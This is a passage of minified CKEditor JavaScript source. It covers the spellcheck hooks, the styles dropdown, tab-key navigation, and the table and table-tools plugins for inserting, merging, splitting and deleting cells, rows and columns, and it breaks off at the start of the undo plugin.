                for (var t = 0; t < n.loadingHelper.loadOrder.length; t++) e = n.loadingHelper.loadOrder[t],
                "function" == typeof n.loadingHelper[e] && n.loadingHelper[e](CKEDITOR.instances[e]),
                delete n.loadingHelper[e];
                n.loadingHelper.loadOrder = [];
            })) : window.SCAYT && "function" == typeof window.SCAYT.CKSCAYT && (CKEDITOR.fireOnce("scaytReady"),
            e.scayt || "function" == typeof t && t(e));
        }
    }, CKEDITOR.on("scaytReady", function() {
        if (!0 === CKEDITOR.config.scayt_handleCheckDirty && ((e = CKEDITOR.editor.prototype).checkDirty = CKEDITOR.tools.override(e.checkDirty, function(i) {
            return function() {
                var e = null, t = this.scayt;
                if (CKEDITOR.plugins.scayt && CKEDITOR.plugins.scayt.state[this.name] && this.scayt) {
                    if (e = "ready" == this.status) {
                        var n = t.removeMarkupFromString(this.getSnapshot());
                        t = t.removeMarkupFromString(this._.previousValue), e = e && t !== n;
                    }
                } else e = i.call(this);
                return e;
            };
        }), e.resetDirty = CKEDITOR.tools.override(e.resetDirty, function(t) {
            return function() {
                var e = this.scayt;
                CKEDITOR.plugins.scayt && CKEDITOR.plugins.scayt.state[this.name] && this.scayt ? this._.previousValue = e.removeMarkupFromString(this.getSnapshot()) : t.call(this);
            };
        })), !0 === CKEDITOR.config.scayt_handleUndoRedo) {
            var e = CKEDITOR.plugins.undo.Image.prototype, t = "function" == typeof e.equalsContent ? "equalsContent" : "equals";
            e[t] = CKEDITOR.tools.override(e[t], function(a) {
                return function(e) {
                    var t, n = e.editor.scayt, i = this.contents, o = e.contents;
                    return CKEDITOR.plugins.scayt && CKEDITOR.plugins.scayt.state[e.editor.name] && e.editor.scayt && (this.contents = n.removeMarkupFromString(i) || "",
                    e.contents = n.removeMarkupFromString(o) || ""), t = a.apply(this, arguments), this.contents = i,
                    e.contents = o, t;
                };
            });
        }
    }), CKEDITOR.plugins.add("stylescombo", {
        requires: "richcombo",
        init: function(r) {
            var s = r.config, l = r.lang.stylescombo, c = {}, d = [], u = [];
            r.on("stylesSet", function(e) {
                if (e = e.data.styles) {
                    for (var t, n, i, o = 0, a = e.length; o < a; o++) t = e[o], r.blockless && t.element in CKEDITOR.dtd.$block || (n = t.name,
                    t = new CKEDITOR.style(t), r.filter.customConfig && !r.filter.check(t)) || (t._name = n,
                    t._.enterMode = s.enterMode, t._.type = i = t.assignedTo || t.type, t._.weight = o + 1e3 * (i == CKEDITOR.STYLE_OBJECT ? 1 : i == CKEDITOR.STYLE_BLOCK ? 2 : 3),
                    c[n] = t, d.push(t), u.push(t));
                    d.sort(function(e, t) {
                        return e._.weight - t._.weight;
                    });
                }
            }), r.ui.addRichCombo("Styles", {
                label: l.label,
                title: l.panelTitle,
                toolbar: "styles,10",
                allowedContent: u,
                panel: {
                    css: [ CKEDITOR.skin.getPath("editor") ].concat(s.contentsCss),
                    multiSelect: !0,
                    attributes: {
                        "aria-label": l.panelTitle
                    }
                },
                init: function() {
                    var e, t, n, i, o, a;
                    for (o = 0, a = d.length; o < a; o++) t = (e = d[o])._name, (i = e._.type) != n && (this.startGroup(l["panelTitle" + i]),
                    n = i), this.add(t, e.type == CKEDITOR.STYLE_OBJECT ? t : e.buildPreview(), t);
                    this.commit();
                },
                onClick: function(e) {
                    r.focus(), r.fire("saveSnapshot"), e = c[e];
                    var t = r.elementPath();
                    r[e.checkActive(t, r) ? "removeStyle" : "applyStyle"](e), r.fire("saveSnapshot");
                },
                onRender: function() {
                    r.on("selectionChange", function(e) {
                        for (var t, n = this.getValue(), i = 0, o = (e = e.data.path.elements).length; i < o; i++) for (var a in t = e[i],
                        c) if (c[a].checkElementRemovable(t, !0, r)) return void (a != n && this.setValue(a));
                        this.setValue("");
                    }, this);
                },
                onOpen: function() {
                    var e = r.getSelection().getSelectedElement(), t = (e = r.elementPath(e), [ 0, 0, 0, 0 ]);
                    for (var n in this.showAll(), this.unmarkAll(), c) {
                        var i = c[n], o = i._.type;
                        i.checkApplicable(e, r, r.activeFilter) ? t[o]++ : this.hideItem(n), i.checkActive(e, r) && this.mark(n);
                    }
                    t[CKEDITOR.STYLE_BLOCK] || this.hideGroup(l["panelTitle" + CKEDITOR.STYLE_BLOCK]),
                    t[CKEDITOR.STYLE_INLINE] || this.hideGroup(l["panelTitle" + CKEDITOR.STYLE_INLINE]),
                    t[CKEDITOR.STYLE_OBJECT] || this.hideGroup(l["panelTitle" + CKEDITOR.STYLE_OBJECT]);
                },
                refresh: function() {
                    var e = r.elementPath();
                    if (e) {
                        for (var t in c) if (c[t].checkApplicable(e, r, r.activeFilter)) return;
                        this.setState(CKEDITOR.TRISTATE_DISABLED);
                    }
                },
                reset: function() {
                    c = {}, d = [];
                }
            });
        }
    }), function() {
        function o(s) {
            return {
                editorFocus: !1,
                canUndo: !1,
                modes: {
                    wysiwyg: 1
                },
                exec: function(e) {
                    if (e.editable().hasFocus) {
                        var t, n = e.getSelection();
                        if (t = new CKEDITOR.dom.elementPath(n.getCommonAncestor(), n.root).contains({
                            td: 1,
                            th: 1
                        }, 1)) {
                            if (n = e.createRange(), (o = CKEDITOR.tools.tryThese(function() {
                                var e = t.getParent().$.cells[t.$.cellIndex + (s ? -1 : 1)];
                                return e.parentNode.parentNode, e;
                            }, function() {
                                var e = t.getParent();
                                return (e = e.getAscendant("table").$.rows[e.$.rowIndex + (s ? -1 : 1)]).cells[s ? e.cells.length - 1 : 0];
                            })) || s) {
                                if (!o) return !0;
                                o = new CKEDITOR.dom.element(o), n.moveToElementEditStart(o), (!n.checkStartOfBlock() || !n.checkEndOfBlock()) && n.selectNodeContents(o);
                            } else {
                                for (var i = t.getAscendant("table").$, o = t.getParent().$.cells, a = (i = new CKEDITOR.dom.element(i.insertRow(-1), e.document),
                                0), r = o.length; a < r; a++) i.append(new CKEDITOR.dom.element(o[a], e.document).clone(!1, !1)).appendBogus();
                                n.moveToElementEditStart(i);
                            }
                            return n.select(!0), !0;
                        }
                    }
                    return !1;
                }
            };
        }
        var a = {
            editorFocus: !1,
            modes: {
                wysiwyg: 1,
                source: 1
            }
        }, r = {
            exec: function(e) {
                e.container.focusNext(!0, e.tabIndex);
            }
        }, s = {
            exec: function(e) {
                e.container.focusPrevious(!0, e.tabIndex);
            }
        };
        CKEDITOR.plugins.add("tab", {
            init: function(t) {
                for (var e = !1 !== t.config.enableTabKeyTools, n = t.config.tabSpaces || 0, i = ""; n--; ) i += " ";
                i && t.on("key", function(e) {
                    9 == e.data.keyCode && (t.insertText(i), e.cancel());
                }), e && t.on("key", function(e) {
                    (9 == e.data.keyCode && t.execCommand("selectNextCell") || e.data.keyCode == CKEDITOR.SHIFT + 9 && t.execCommand("selectPreviousCell")) && e.cancel();
                }), t.addCommand("blur", CKEDITOR.tools.extend(r, a)), t.addCommand("blurBack", CKEDITOR.tools.extend(s, a)),
                t.addCommand("selectNextCell", o()), t.addCommand("selectPreviousCell", o(!0));
            }
        });
    }(), CKEDITOR.dom.element.prototype.focusNext = function(e, t) {
        var n, i, o, a, r, s, l = void 0 === t ? this.getTabIndex() : t;
        if (l <= 0) for (r = this.getNextSourceNode(e, CKEDITOR.NODE_ELEMENT); r; ) {
            if (r.isVisible() && 0 === r.getTabIndex()) {
                o = r;
                break;
            }
            r = r.getNextSourceNode(!1, CKEDITOR.NODE_ELEMENT);
        } else for (r = this.getDocument().getBody().getFirst(); r = r.getNextSourceNode(!1, CKEDITOR.NODE_ELEMENT); ) {
            if (!n) if (!i && r.equals(this)) {
                if (i = !0, e) {
                    if (!(r = r.getNextSourceNode(!0, CKEDITOR.NODE_ELEMENT))) break;
                    n = 1;
                }
            } else i && !this.contains(r) && (n = 1);
            if (r.isVisible() && !((s = r.getTabIndex()) < 0)) {
                if (n && s == l) {
                    o = r;
                    break;
                }
                l < s && (!o || !a || s < a) ? (o = r, a = s) : !o && 0 === s && (o = r, a = s);
            }
        }
        o && o.focus();
    }, CKEDITOR.dom.element.prototype.focusPrevious = function(e, t) {
        for (var n, i, o, a, r = void 0 === t ? this.getTabIndex() : t, s = 0, l = this.getDocument().getBody().getLast(); l = l.getPreviousSourceNode(!1, CKEDITOR.NODE_ELEMENT); ) {
            if (!n) if (!i && l.equals(this)) {
                if (i = !0, e) {
                    if (!(l = l.getPreviousSourceNode(!0, CKEDITOR.NODE_ELEMENT))) break;
                    n = 1;
                }
            } else i && !this.contains(l) && (n = 1);
            if (l.isVisible() && !((a = l.getTabIndex()) < 0)) if (r <= 0) {
                if (n && 0 === a) {
                    o = l;
                    break;
                }
                s < a && (o = l, s = a);
            } else {
                if (n && a == r) {
                    o = l;
                    break;
                }
                a < r && (!o || s < a) && (o = l, s = a);
            }
        }
        o && o.focus();
    }, CKEDITOR.plugins.add("table", {
        requires: "dialog",
        init: function(e) {
            function t(e) {
                return CKEDITOR.tools.extend(e || {}, {
                    contextSensitive: 1,
                    refresh: function(e, t) {
                        this.setState(t.contains("table", 1) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED);
                    }
                });
            }
            if (!e.blockless) {
                var n = e.lang.table;
                e.addCommand("table", new CKEDITOR.dialogCommand("table", {
                    context: "table",
                    allowedContent: "table{width,height}[align,border,cellpadding,cellspacing,summary];caption tbody thead tfoot;th td tr[scope];" + (e.plugins.dialogadvtab ? "table" + e.plugins.dialogadvtab.allowedContent() : ""),
                    requiredContent: "table",
                    contentTransformations: [ [ "table{width}: sizeToStyle", "table[width]: sizeToAttribute" ] ]
                })), e.addCommand("tableProperties", new CKEDITOR.dialogCommand("tableProperties", t())),
                e.addCommand("tableDelete", t({
                    exec: function(e) {
                        var t = e.elementPath().contains("table", 1);
                        if (t) {
                            var n = t.getParent(), i = e.editable();
                            1 == n.getChildCount() && !n.is("td", "th") && !n.equals(i) && (t = n), (e = e.createRange()).moveToPosition(t, CKEDITOR.POSITION_BEFORE_START),
                            t.remove(), e.select();
                        }
                    }
                })), e.ui.addButton && e.ui.addButton("Table", {
                    label: n.toolbar,
                    command: "table",
                    toolbar: "insert,30"
                }), CKEDITOR.dialog.add("table", this.path + "dialogs/table.js"), CKEDITOR.dialog.add("tableProperties", this.path + "dialogs/table.js"),
                e.addMenuItems && e.addMenuItems({
                    table: {
                        label: n.menu,
                        command: "tableProperties",
                        group: "table",
                        order: 5
                    },
                    tabledelete: {
                        label: n.deleteTable,
                        command: "tableDelete",
                        group: "table",
                        order: 1
                    }
                }), e.on("doubleclick", function(e) {
                    e.data.element.is("table") && (e.data.dialog = "tableProperties");
                }), e.contextMenu && e.contextMenu.addListener(function() {
                    return {
                        tabledelete: CKEDITOR.TRISTATE_OFF,
                        table: CKEDITOR.TRISTATE_OFF
                    };
                });
            }
        }
    }), function() {
        function O(e) {
            function t(e) {
                !(0 < n.length) && e.type == CKEDITOR.NODE_ELEMENT && h.test(e.getName()) && !e.getCustomData("selected_cell") && (CKEDITOR.dom.element.setMarker(i, e, "selected_cell", !0),
                n.push(e));
            }
            e = e.getRanges();
            for (var n = [], i = {}, o = 0; o < e.length; o++) {
                var a, r = e[o];
                if (r.collapsed) (r = (r = r.getCommonAncestor()).getAscendant("td", !0) || r.getAscendant("th", !0)) && n.push(r); else for ((r = new CKEDITOR.dom.walker(r)).guard = t; a = r.next(); ) a.type == CKEDITOR.NODE_ELEMENT && a.is(CKEDITOR.dtd.table) || (a = a.getAscendant("td", !0) || a.getAscendant("th", !0)) && !a.getCustomData("selected_cell") && (CKEDITOR.dom.element.setMarker(i, a, "selected_cell", !0),
                n.push(a));
            }
            return CKEDITOR.dom.element.clearAllMarkers(i), n;
        }
        function o(e, t) {
            var n = (i = (r = O(e))[0]).getAscendant("table"), i = i.getDocument(), o = (s = r[0].getParent()).$.rowIndex, a = (r = r[r.length - 1]).getParent().$.rowIndex + r.$.rowSpan - 1, r = new CKEDITOR.dom.element(n.$.rows[a]), s = (o = t ? o : a,
            t ? s : r);
            for (n = (r = CKEDITOR.tools.buildTableMap(n))[o], o = t ? r[o - 1] : r[o + 1],
            r = r[0].length, i = i.createElement("tr"), a = 0; n[a] && a < r; a++) {
                var l;
                1 < n[a].rowSpan && o && n[a] == o[a] ? (l = n[a]).rowSpan += 1 : ((l = new CKEDITOR.dom.element(n[a]).clone()).removeAttribute("rowSpan"),
                l.appendBogus(), i.append(l), l = l.$), a += l.colSpan - 1;
            }
            t ? i.insertBefore(s) : i.insertAfter(s);
        }
        function l(e, t) {
            for (var n = t ? 1 / 0 : 0, i = 0; i < e.length; i++) {
                for (var o, a = t, r = (o = e[i]).getParent().$.cells, s = 0, l = 0; l < r.length; l++) {
                    var c = r[l];
                    if (s += a ? 1 : c.colSpan, c == o.$) break;
                }
                o = s - 1, (t ? o < n : n < o) && (n = o);
            }
            return n;
        }
        function a(e, t) {
            for (var n = (o = O(e))[0].getAscendant("table"), i = l(o, 1), o = l(o), a = (i = t ? i : o,
            CKEDITOR.tools.buildTableMap(n)), r = (n = [], o = [], a.length), s = 0; s < r; s++) n.push(a[s][i]),
            o.push(t ? a[s][i - 1] : a[s][i + 1]);
            for (s = 0; s < r; s++) n[s] && (1 < n[s].colSpan && o[s] == n[s] ? (i = n[s]).colSpan += 1 : ((i = new CKEDITOR.dom.element(n[s]).clone()).removeAttribute("colSpan"),
            i.appendBogus(), i[t ? "insertBefore" : "insertAfter"].call(i, new CKEDITOR.dom.element(n[s])),
            i = i.$), s += i.rowSpan - 1);
        }
        function r(e, t) {
            var n = e.getStartElement();
            if (n = n.getAscendant("td", 1) || n.getAscendant("th", 1)) {
                var i = n.clone();
                i.appendBogus(), t ? i.insertBefore(n) : i.insertAfter(n);
            }
        }
        function u(e, t) {
            var n = e.getDocument(), i = CKEDITOR.document;
            CKEDITOR.env.ie && 10 == CKEDITOR.env.version && (i.focus(), n.focus()), (n = new CKEDITOR.dom.range(n))["moveToElementEdit" + (t ? "End" : "Start")](e) || (n.selectNodeContents(e),
            n.collapse(!t)), n.select(!0);
        }
        function D(e, t, n) {
            if (e = e[t], void 0 === n) return e;
            for (t = 0; e && t < e.length; t++) {
                if (n.is && e[t] == n.$) return t;
                if (t == n) return new CKEDITOR.dom.element(e[t]);
            }
            return n.is ? -1 : null;
        }
        function s(e, t, n) {
            var i, o, a = O(e);
            if ((t ? 1 != a.length : a.length < 2) || (i = e.getCommonAncestor()) && i.type == CKEDITOR.NODE_ELEMENT && i.is("table")) return !1;
            i = (e = a[0]).getAscendant("table");
            var r = CKEDITOR.tools.buildTableMap(i), s = r.length, l = r[0].length, c = e.getParent().$.rowIndex, d = D(r, c, e);
            if (t) {
                var u;
                try {
                    f = parseInt(e.getAttribute("rowspan"), 10) || 1, o = parseInt(e.getAttribute("colspan"), 10) || 1,
                    u = r["up" == t ? c - f : "down" == t ? c + f : c]["left" == t ? d - o : "right" == t ? d + o : d];
                } catch (e) {
                    return !1;
                }
                if (!u || e.$ == u) return !1;
                a["up" == t || "left" == t ? "unshift" : "push"](new CKEDITOR.dom.element(u));
            }
            t = e.getDocument();
            var h = c, f = u = 0, m = !n && new CKEDITOR.dom.documentFragment(t), g = 0;
            for (t = 0; t < a.length; t++) {
                var E = (o = a[t]).getParent(), p = o.getFirst(), T = o.$.colSpan, C = o.$.rowSpan, I = D(r, E = E.$.rowIndex, o);
                g += T * C, f = Math.max(f, I - d + T), u = Math.max(u, E - c + C), n || ((C = (T = o).getBogus()) && C.remove(),
                T.trim(), o.getChildren().count() && (E == h || !p || p.isBlockBoundary && p.isBlockBoundary({
                    br: 1
                }) || (h = m.getLast(CKEDITOR.dom.walker.whitespaces(!0))) && (!h.is || !h.is("br")) && m.append("br"),
                o.moveChildren(m)), t ? o.remove() : o.setHtml("")), h = E;
            }
            if (n) return u * f == g;
            for (m.moveChildren(e), e.appendBogus(), l <= f ? e.removeAttribute("rowSpan") : e.$.rowSpan = u,
            s <= u ? e.removeAttribute("colSpan") : e.$.colSpan = f, t = (a = (n = new CKEDITOR.dom.nodeList(i.$.rows)).count()) - 1; 0 <= t; t--) (i = n.getItem(t)).$.cells.length || (i.remove(),
            a++);
            return e;
        }
        function c(e, t) {
            var n = O(e);
            if (1 < n.length) return !1;
            if (t) return !0;
            var i, o = (l = (n = n[0]).getParent()).getAscendant("table"), a = D(c = CKEDITOR.tools.buildTableMap(o), d = l.$.rowIndex, n);
            if (1 < (s = n.$.rowSpan)) {
                i = Math.ceil(s / 2);
                for (var r, s = Math.floor(s / 2), l = d + i, c = (o = new CKEDITOR.dom.element(o.$.rows[l]),
                D(c, l)), d = (l = n.clone(), 0); d < c.length; d++) {
                    if ((r = c[d]).parentNode == o.$ && a < d) {
                        l.insertBefore(new CKEDITOR.dom.element(r));
                        break;
                    }
                    r = null;
                }
                r || o.append(l);
            } else for (s = i = 1, (o = l.clone()).insertAfter(l), o.append(l = n.clone()),
            r = D(c, d), a = 0; a < r.length; a++) r[a].rowSpan++;
            return l.appendBogus(), n.$.rowSpan = i, l.$.rowSpan = s, 1 == i && n.removeAttribute("rowSpan"),
            1 == s && l.removeAttribute("rowSpan"), l;
        }
        function d(e, t) {
            var n = O(e);
            if (1 < n.length) return !1;
            if (t) return !0;
            var i = (n = n[0]).getParent(), o = i.getAscendant("table"), a = D(o = CKEDITOR.tools.buildTableMap(o), i.$.rowIndex, n);
            if (1 < (r = n.$.colSpan)) i = Math.ceil(r / 2), r = Math.floor(r / 2); else {
                for (var r = i = 1, s = [], l = 0; l < o.length; l++) {
                    var c = o[l];
                    s.push(c[a]), 1 < c[a].rowSpan && (l += c[a].rowSpan - 1);
                }
                for (o = 0; o < s.length; o++) s[o].colSpan++;
            }
            return (o = n.clone()).insertAfter(n), o.appendBogus(), n.$.colSpan = i, o.$.colSpan = r,
            1 == i && n.removeAttribute("colSpan"), 1 == r && o.removeAttribute("colSpan"),
            o;
        }
        var h = /^(?:td|th)$/;
        CKEDITOR.plugins.tabletools = {
            requires: "table,dialog,contextmenu",
            init: function(i) {
                function e(e) {
                    return CKEDITOR.tools.extend(e || {}, {
                        contextSensitive: 1,
                        refresh: function(e, t) {
                            this.setState(t.contains({
                                td: 1,
                                th: 1
                            }, 1) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED);
                        }
                    });
                }
                function t(e, t) {
                    var n = i.addCommand(e, t);
                    i.addFeature(n);
                }
                var n = i.lang.table;
                t("cellProperties", new CKEDITOR.dialogCommand("cellProperties", e({
                    allowedContent: "td th{width,height,border-color,background-color,white-space,vertical-align,text-align}[colspan,rowspan]",
                    requiredContent: "table"
                }))), CKEDITOR.dialog.add("cellProperties", this.path + "dialogs/tableCell.js"),
                t("rowDelete", e({
                    requiredContent: "table",
                    exec: function(e) {
                        u(function e(t) {
                            if (t instanceof CKEDITOR.dom.selection) {
                                for (var n = (a = O(t))[0].getAscendant("table"), i = CKEDITOR.tools.buildTableMap(n), o = (t = a[0].getParent().$.rowIndex,
                                (a = a[a.length - 1]).getParent().$.rowIndex + a.$.rowSpan - 1), a = [], r = t; r <= o; r++) {
                                    for (var s = i[r], l = new CKEDITOR.dom.element(n.$.rows[r]), c = 0; c < s.length; c++) {
                                        var d = new CKEDITOR.dom.element(s[c]), u = d.getParent().$.rowIndex;
                                        1 == d.$.rowSpan ? d.remove() : (d.$.rowSpan -= 1, u == r && ((u = i[r + 1])[c - 1] ? d.insertAfter(new CKEDITOR.dom.element(u[c - 1])) : new CKEDITOR.dom.element(n.$.rows[r + 1]).append(d, 1))),
                                        c += d.$.colSpan - 1;
                                    }
                                    a.push(l);
                                }
                                for (i = n.$.rows, n = new CKEDITOR.dom.element(i[o + 1] || (0 < t ? i[t - 1] : null) || n.$.parentNode),
                                r = a.length; 0 <= r; r--) e(a[r]);
                                return n;
                            }
                            return t instanceof CKEDITOR.dom.element && (1 == (n = t.getAscendant("table")).$.rows.length ? n.remove() : t.remove()),
                            null;
                        }(e = e.getSelection()));
                    }
                })), t("rowInsertBefore", e({
                    requiredContent: "table",
                    exec: function(e) {
                        o(e = e.getSelection(), !0);
                    }
                })), t("rowInsertAfter", e({
                    requiredContent: "table",
                    exec: function(e) {
                        o(e = e.getSelection());
                    }
                })), t("columnDelete", e({
                    requiredContent: "table",
                    exec: function(e) {
                        for (var t, n, i = (e = O(e = e.getSelection()))[0], o = e[e.length - 1], a = (e = i.getAscendant("table"),
                        CKEDITOR.tools.buildTableMap(e)), r = [], s = 0, l = a.length; s < l; s++) for (var c = 0, d = a[s].length; c < d; c++) a[s][c] == i.$ && (t = c),
                        a[s][c] == o.$ && (n = c);
                        for (s = t; s <= n; s++) for (c = 0; c < a.length; c++) o = a[c], i = new CKEDITOR.dom.element(e.$.rows[c]),
                        (o = new CKEDITOR.dom.element(o[s])).$ && (1 == o.$.colSpan ? o.remove() : o.$.colSpan -= 1,
                        c += o.$.rowSpan - 1, i.$.cells.length || r.push(i));
                        n = e.$.rows[0] && e.$.rows[0].cells, t = new CKEDITOR.dom.element(n[t] || (t ? n[t - 1] : e.$.parentNode)),
                        r.length == l && e.remove(), t && u(t, !0);
                    }
                })), t("columnInsertBefore", e({
                    requiredContent: "table",
                    exec: function(e) {
                        a(e = e.getSelection(), !0);
                    }
                })), t("columnInsertAfter", e({
                    requiredContent: "table",
                    exec: function(e) {
                        a(e = e.getSelection());
                    }
                })), t("cellDelete", e({
                    requiredContent: "table",
                    exec: function(e) {
                        !function e(t) {
                            if (t instanceof CKEDITOR.dom.selection) {
                                var n, i = (t = O(t))[0] && t[0].getAscendant("table");
                                e: {
                                    var o = 0;
                                    n = t.length - 1;
                                    for (var a, r, s = {}; a = t[o++]; ) CKEDITOR.dom.element.setMarker(s, a, "delete_cell", !0);
                                    for (o = 0; a = t[o++]; ) if ((r = a.getPrevious()) && !r.getCustomData("delete_cell") || (r = a.getNext()) && !r.getCustomData("delete_cell")) {
                                        CKEDITOR.dom.element.clearAllMarkers(s), n = r;
                                        break e;
                                    }
                                    CKEDITOR.dom.element.clearAllMarkers(s), n = (r = (r = t[0].getParent()).getPrevious()) ? r.getLast() : (r = (r = t[n].getParent()).getNext()) ? r.getChild(0) : null;
                                }
                                for (r = t.length - 1; 0 <= r; r--) e(t[r]);
                                n ? u(n, !0) : i && i.remove();
                            } else t instanceof CKEDITOR.dom.element && (1 == (i = t.getParent()).getChildCount() ? i.remove() : t.remove());
                        }(e = e.getSelection());
                    }
                })), t("cellMerge", e({
                    allowedContent: "td[colspan,rowspan]",
                    requiredContent: "td[colspan,rowspan]",
                    exec: function(e) {
                        u(s(e.getSelection()), !0);
                    }
                })), t("cellMergeRight", e({
                    allowedContent: "td[colspan]",
                    requiredContent: "td[colspan]",
                    exec: function(e) {
                        u(s(e.getSelection(), "right"), !0);
                    }
                })), t("cellMergeDown", e({
                    allowedContent: "td[rowspan]",
                    requiredContent: "td[rowspan]",
                    exec: function(e) {
                        u(s(e.getSelection(), "down"), !0);
                    }
                })), t("cellVerticalSplit", e({
                    allowedContent: "td[rowspan]",
                    requiredContent: "td[rowspan]",
                    exec: function(e) {
                        u(c(e.getSelection()));
                    }
                })), t("cellHorizontalSplit", e({
                    allowedContent: "td[colspan]",
                    requiredContent: "td[colspan]",
                    exec: function(e) {
                        u(d(e.getSelection()));
                    }
                })), t("cellInsertBefore", e({
                    requiredContent: "table",
                    exec: function(e) {
                        r(e = e.getSelection(), !0);
                    }
                })), t("cellInsertAfter", e({
                    requiredContent: "table",
                    exec: function(e) {
                        r(e = e.getSelection());
                    }
                })), i.addMenuItems && i.addMenuItems({
                    tablecell: {
                        label: n.cell.menu,
                        group: "tablecell",
                        order: 1,
                        getItems: function() {
                            var e = i.getSelection(), t = O(e);
                            return {
                                tablecell_insertBefore: CKEDITOR.TRISTATE_OFF,
                                tablecell_insertAfter: CKEDITOR.TRISTATE_OFF,
                                tablecell_delete: CKEDITOR.TRISTATE_OFF,
                                tablecell_merge: s(e, null, !0) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                                tablecell_merge_right: s(e, "right", !0) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                                tablecell_merge_down: s(e, "down", !0) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                                tablecell_split_vertical: c(e, !0) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                                tablecell_split_horizontal: d(e, !0) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                                tablecell_properties: 0 < t.length ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED
                            };
                        }
                    },
                    tablecell_insertBefore: {
                        label: n.cell.insertBefore,
                        group: "tablecell",
                        command: "cellInsertBefore",
                        order: 5
                    },
                    tablecell_insertAfter: {
                        label: n.cell.insertAfter,
                        group: "tablecell",
                        command: "cellInsertAfter",
                        order: 10
                    },
                    tablecell_delete: {
                        label: n.cell.deleteCell,
                        group: "tablecell",
                        command: "cellDelete",
                        order: 15
                    },
                    tablecell_merge: {
                        label: n.cell.merge,
                        group: "tablecell",
                        command: "cellMerge",
                        order: 16
                    },
                    tablecell_merge_right: {
                        label: n.cell.mergeRight,
                        group: "tablecell",
                        command: "cellMergeRight",
                        order: 17
                    },
                    tablecell_merge_down: {
                        label: n.cell.mergeDown,
                        group: "tablecell",
                        command: "cellMergeDown",
                        order: 18
                    },
                    tablecell_split_horizontal: {
                        label: n.cell.splitHorizontal,
                        group: "tablecell",
                        command: "cellHorizontalSplit",
                        order: 19
                    },
                    tablecell_split_vertical: {
                        label: n.cell.splitVertical,
                        group: "tablecell",
                        command: "cellVerticalSplit",
                        order: 20
                    },
                    tablecell_properties: {
                        label: n.cell.title,
                        group: "tablecellproperties",
                        command: "cellProperties",
                        order: 21
                    },
                    tablerow: {
                        label: n.row.menu,
                        group: "tablerow",
                        order: 1,
                        getItems: function() {
                            return {
                                tablerow_insertBefore: CKEDITOR.TRISTATE_OFF,
                                tablerow_insertAfter: CKEDITOR.TRISTATE_OFF,
                                tablerow_delete: CKEDITOR.TRISTATE_OFF
                            };
                        }
                    },
                    tablerow_insertBefore: {
                        label: n.row.insertBefore,
                        group: "tablerow",
                        command: "rowInsertBefore",
                        order: 5
                    },
                    tablerow_insertAfter: {
                        label: n.row.insertAfter,
                        group: "tablerow",
                        command: "rowInsertAfter",
                        order: 10
                    },
                    tablerow_delete: {
                        label: n.row.deleteRow,
                        group: "tablerow",
                        command: "rowDelete",
                        order: 15
                    },
                    tablecolumn: {
                        label: n.column.menu,
                        group: "tablecolumn",
                        order: 1,
                        getItems: function() {
                            return {
                                tablecolumn_insertBefore: CKEDITOR.TRISTATE_OFF,
                                tablecolumn_insertAfter: CKEDITOR.TRISTATE_OFF,
                                tablecolumn_delete: CKEDITOR.TRISTATE_OFF
                            };
                        }
                    },
                    tablecolumn_insertBefore: {
                        label: n.column.insertBefore,
                        group: "tablecolumn",
                        command: "columnInsertBefore",
                        order: 5
                    },
                    tablecolumn_insertAfter: {
                        label: n.column.insertAfter,
                        group: "tablecolumn",
                        command: "columnInsertAfter",
                        order: 10
                    },
                    tablecolumn_delete: {
                        label: n.column.deleteColumn,
                        group: "tablecolumn",
                        command: "columnDelete",
                        order: 15
                    }
                }), i.contextMenu && i.contextMenu.addListener(function(e, t, n) {
                    return (e = n.contains({
                        td: 1,
                        th: 1
                    }, 1)) && !e.isReadOnly() ? {
                        tablecell: CKEDITOR.TRISTATE_OFF,
                        tablerow: CKEDITOR.TRISTATE_OFF,
                        tablecolumn: CKEDITOR.TRISTATE_OFF
                    } : null;
                });
            },
            getSelectedCells: O
        }, CKEDITOR.plugins.add("tabletools", CKEDITOR.plugins.tabletools);
    }(), CKEDITOR.tools.buildTableMap = function(e) {
        e = e.$.rows;
        for (var t = -1, n = [], i = 0; i < e.length; i++) {
            !n[++t] && (n[t] = []);
            for (var o = -1, a = 0; a < e[i].cells.length; a++) {
                for (s = e[i].cells[a], o++; n[t][o]; ) o++;
                for (var r = isNaN(s.colSpan) ? 1 : s.colSpan, s = isNaN(s.rowSpan) ? 1 : s.rowSpan, l = 0; l < s; l++) {
                    n[t + l] || (n[t + l] = []);
                    for (var c = 0; c < r; c++) n[t + l][o + c] = e[i].cells[a];
                }
                o += r - 1;
            }
        }
        return n;
    }, function() {
        var s = [ CKEDITOR.CTRL + 90, CKEDITOR.CTRL + 89, CKEDITOR.CTRL + CKEDITOR.SHIFT + 90 ], n = {
            8: 1,
            46: 1
        };
        CKEDITOR.plugins.add("undo", {
            init: function(e) {
                function t(e) {
                    i.enabled && !1 !== e.data.command.canUndo && i.save();
                }
                function n() {
                    i.enabled = !e.readOnly && "wysiwyg" == e.mode, i.onChange();
                }
                var i = e.undoManager = new l(e), o = i.editingHandler = new c(i), a = e.addCommand("undo", {
                    exec: function() {
                        i.undo() && (e.selectionChange(), this.fire("afterUndo"));
                    },
                    startDisabled: !0,
                    canUndo: !1
                }), r = e.addCommand("redo", {
                    exec: function() {
                        i.redo() && (e.selectionChange(), this.fire("afterRedo"));
                    },
                    startDisabled: !0,
                    canUndo: !1
                });
                e.setKeystroke([ [ s[0], "undo" ], [ s[1], "redo" ], [ s[2], "redo" ] ]), i.onChange = function() {
                    a.setState(i.undoable() ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED), r.setState(i.redoable() ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED);
                }, e.on("beforeCommandExec", t), e.on("afterCommandExec", t), e.on("saveSnapshot", function(e) {
                    i.save(e.data && e.data.contentOnly);
                }), e.on("contentDom", o.attachListeners, o), e.on("instanceReady", function() {
                    e.fire("saveSnapshot");
                }), e.on("beforeModeUnload", function() {
                    "wysiwyg" == e.mode && i.save(!0);
